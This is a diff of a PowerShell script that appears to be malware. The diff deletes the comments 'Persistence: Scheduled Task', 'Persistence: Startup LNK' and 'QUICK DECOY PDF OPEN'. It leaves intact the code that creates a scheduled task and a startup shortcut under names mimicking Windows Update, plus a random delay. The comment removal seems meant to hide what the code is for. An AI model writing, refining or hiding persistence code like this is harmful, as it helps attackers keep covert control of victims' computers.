@@ -21,7 +21,6 @@ function Save-ScriptToDisk {
 }
 $scriptPath = Save-ScriptToDisk -Destination $localPath
 
-# Persistence: Scheduled Task
 $taskName = "WindowsUpdateTask"
 $taskExists = Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
 if (-not $taskExists) {
@@ -36,7 +35,6 @@ if (-not $taskExists) {
     } catch {}
 }
 
-# Persistence: Startup LNK
 $startupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
 $lnkPath = "$startupPath\WindowsUpdateHelper.lnk"
 if (-not (Test-Path $lnkPath)) {
@@ -48,7 +46,6 @@ if (-not (Test-Path $lnkPath)) {
     $shortcut.Save()
 }
 
-# === QUICK DECOY PDF OPEN (Minimal Delay) ===
 Start-Sleep -Milliseconds (Get-Random -Min 500 -Max 1500)
 
 $cache = "$env:APPDATA\Microsoft\Windows\Caches"
